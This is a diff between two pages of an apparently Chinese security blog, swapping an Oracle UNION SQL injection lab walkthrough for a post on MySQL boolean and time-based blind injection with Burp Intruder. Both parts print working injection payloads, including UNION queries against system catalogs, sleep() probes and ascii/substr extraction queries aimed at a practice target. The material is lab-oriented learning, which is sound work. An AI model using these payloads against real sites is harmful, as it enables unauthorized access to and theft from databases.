@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html><head>
-<title>Oracle 联合注入</title>
+<title>用 Burp Suite 跑 MySQL 盲注</title>
 
 
 
@@ -10,26 +10,26 @@
 <meta name="google-site-verification" content="">
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
 <meta content="telephone=no" name="format-detection">
-<meta name="description" content="靶场演示">
+<meta name="description" content="用 burp 跑脚本很方便，但是时间盲注最好手工">
 <meta name="renderer" content="webkit">
 <meta name="theme-color" content="#ffffff">
 
 
 
-<meta property="og:title" content="Oracle 联合注入" />
-<meta property="og:description" content="靶场演示" />
+<meta property="og:title" content="用 Burp Suite 跑 MySQL 盲注" />
+<meta property="og:description" content="用 burp 跑脚本很方便，但是时间盲注最好手工" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://xxxhidexxx.github.io/posts/sec/sqli2/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2024-02-02T00:00:00+00:00" />
-<meta property="article:modified_time" content="2024-02-02T00:00:00+00:00" /><meta property="og:site_name" content="My Blog" />
+<meta property="og:url" content="https://xxxhidexxx.github.io/posts/sec/sqli3/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-02-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-02-07T00:00:00+00:00" /><meta property="og:site_name" content="My Blog" />
 
 
 
 
 
 
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Oracle 联合注入"/>
-<meta name="twitter:description" content="靶场演示"/>
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="用 Burp Suite 跑 MySQL 盲注"/>
+<meta name="twitter:description" content="用 burp 跑脚本很方便，但是时间盲注最好手工"/>
 
 
 
@@ -137,6 +137,61 @@
             <div class="toc">
 
 
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>- CATALOG -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e6%8f%90%e8%a6%81" class="nav-提要">
+									提要
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e6%bc%94%e7%a4%ba" class="nav-演示">
+									演示
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
 </div>
             
         </div>
@@ -187,16 +242,16 @@
                 
             >
                 <div class="post-title">
-                    Oracle 联合注入
+                    用 Burp Suite 跑 MySQL 盲注
                     
                     <div class="post-subtitle">
-                        靶场演示
+                        用 burp 跑脚本很方便，但是时间盲注最好手工
                     </div>
                     
                     <div class="post-meta">
                         
                         <time itemprop="datePublished">
-                            2024-02-02 00:00
+                            2024-02-07 00:00
                         </time>
                         
 
@@ -225,40 +280,31 @@
                 
                 <div class="post-body" v-pre>
                 
-                    <p>靶场界面如下。</p>
-<p><img src="/images/sqli1/sqli2-0.png" alt="sqli2"></p>
-<p>我们先确认一下参数 id 处存在注入点。</p>
-<pre><code>http://111.9.41.91:53109/?id=1' or '1'='1
+                    <h2 id="提要">提要</h2>
+<p>盲注就是存在注入点但是看不到回显点。这通常有两种情况，或者是输入 <code>?id=1' and 1=2 --+</code> 能看到报错页面，或者是输入 <code>?id=1' and sleep(3) --+</code> 回车能看到网页延迟刷新。这里 sleep(3) 延迟的不一定是三秒也可能是 3 的倍数，因为 sleep 可能被执行了不止一次。数据库一般都有延时函数，例如 mysql 的 sleep()，这种注入方法一般称为时间盲注。在页面没有任何明确显示的情况下，把响应时间作为一种显示，这个想法很有趣，然而，在现实场景中时间盲注成本比较高，运算量可能比较大，不是很稳定，除非一定要爆破，应该谨慎考虑这个选择。</p>
+<p>我们这里主要演示的是用 burp 脚本进行爆破。如果手工注入的话语句的 = 改成 &gt; 然后使用二分法就可以了，也没什么好讲的。</p>
+<p>在做这个靶场的时候我们发现 burp 跑出来的时间盲注结果和自己手工测试的不一样。相同的测试语句，手工的结果是正确的，但是 burp 的响应时间比较抽象，还不知道原因。</p>
+<p>用 burp 跑有报错的布尔盲注倒是很顺利，如下所述。</p>
+<h2 id="演示">演示</h2>
+<p>还是用之前的靶场进行测试。首先用 <code>' and 1=2 --+</code> 找到注入点。看到页面报错。</p>
+<p><img src="/images/sqli1/sqli3-4.png" alt="sqli3"></p>
+<p>打开 burp 抓包后发送到 intruder，选择集束炸弹。选中要遍历的参数之后点击添加 payload。我们两个的 payload 点位分别是 ascii 和字符串位数，所以类型都选择数值，ascii 我们直接从 1 跑到 128。</p>
+<p><img src="/images/sqli1/sqli3-0.png" alt="sqli3"></p>
+<p>点击 attack 按钮之后可以看到响应包的长度有不同，比较长的就说明是正常显示的。我们把不报错的 ascii 码依次解码得到数据库名 webug。</p>
+<p><img src="/images/sqli1/sqli3-1.png" alt="sqli3"></p>
+<p>然后可以进一步爆破表名和字段名找到 flag。语句的写法例如</p>
+<pre><code>' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;1 --+
 </code></pre>
-<p><img src="/images/sqli1/sqli2-1.png" alt="sqli2"></p>
-<p>当输入 order by 6 时报错，而 order by 5 不报错，确认字段数为 5。</p>
-<pre><code>http://111.9.41.91:53109/?id=1' order by 6 --+
-</code></pre>
-<p><img src="/images/sqli1/sqli2-2.png" alt="sqli2"></p>
-<p>我们现在就可以用联合查询进行注入了。这里需要注意 oracle 的语法，from dual 是占位置用的，因为 oracle 的语句必须包含表名；我们使用 null 而不是 12345 是因为数据类型未知。</p>
-<p>先确认一下没有报错。</p>
-<pre><code>http://111.9.41.91:53109/?id=1' union select null,null,null,null,null from dual --+
-</code></pre>
-<p>然后确认回显点的数据类型，我们只需要一个回显点就够了。</p>
-<pre><code>http://111.9.41.91:53109/?id=1' union select 1,'a',null,null,null from dual --+
-</code></pre>
-<p><img src="/images/sqli1/sqli2-3.png" alt="sqli2"></p>
-<p>现在我们使用 oracle 的自带库。</p>
-<pre><code>http://111.9.41.91:53109/?id=1' union select 1,table_name,null,null,null from user_all_tables --+
-</code></pre>
-<p><img src="/images/sqli1/sqli2-4.png" alt="sqli2"></p>
-<p>我们找到了 flag 的表，进一步查询字段。</p>
-<pre><code>http://111.9.41.91:53109/?id=1' union select 1,column_name,null,null,null from all_tab_columns where table_name='UNION_FLAG' --+
-</code></pre>
-<p><img src="/images/sqli1/sqli2-5.png" alt="sqli2"></p>
-<p>至此我们就找到了 flag。</p>
-<pre><code>http://111.9.41.91:53109/?id=1' union select 1,FLAG,null,null,null from UNION_FLAG --+
-</code></pre>
-<p><img src="/images/sqli1/sqli2-6.png" alt="sqli2"></p>
+<p>讲一下 sql 语法。这里的 substr 的用法是 substr(object,start,length) 所以 start 遍历 1~n，然后 length 永远写 1。这里 limit 0,1 的意思是从第 0 项开始查询 1 项，所以是第一个参数遍历 0~n，第二个参数恒为 1。</p>
+<p>后面重复劳动不是很重要懒得写了。</p>
+<p>然后我们用时间盲注跑一下看看，得到下述结果，响应时间对不上，原因未知，应该是 burp 的问题。</p>
+<p>我们的语句用手工测试的结果没有问题，语法肯定是对的。也讲一下这个语法，if(e1,e2,e3) 的意思是，如果 e1 是对的就执行 e2，否则执行 e3。</p>
+<p><img src="/images/sqli1/sqli3-5.png" alt="sqli3"></p>
+<p><img src="/images/sqli1/sqli3-6.png" alt="sqli3"></p>
 
                     
                     <HR width="100%" id="EOF">
-		    <p style="color:#777;">Last modified on 2024-02-02</p>
+		    <p style="color:#777;">Last modified on 2024-02-07</p>
                     
                 </div>
             </div>
@@ -267,14 +313,14 @@
             <nav class="post-pagination">
 
                 
-                <a class="newer-posts" href="/posts/sec/sqli3/">
-			Next<br>用 Burp Suite 跑 MySQL 盲注
+                <a class="newer-posts" href="/posts/sec/kalinetwork/">
+			Next<br>Kali Linux 网络设置
                 </a>
                 
                 
                 
-                <a class="older-posts" href="/posts/sec/sqli1/">
-			Previous<br>MySQL 联合注入
+                <a class="older-posts" href="/posts/sec/sqli2/">
+			Previous<br>Oracle 联合注入
                 </a>
                 
             </nav>
@@ -348,6 +394,61 @@ Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopene
         
         <div class="toc">
 
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>- CATALOG -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e6%8f%90%e8%a6%81" class="nav-提要">
+									提要
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e6%bc%94%e7%a4%ba" class="nav-演示">
+									演示
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
 
 </div>
         
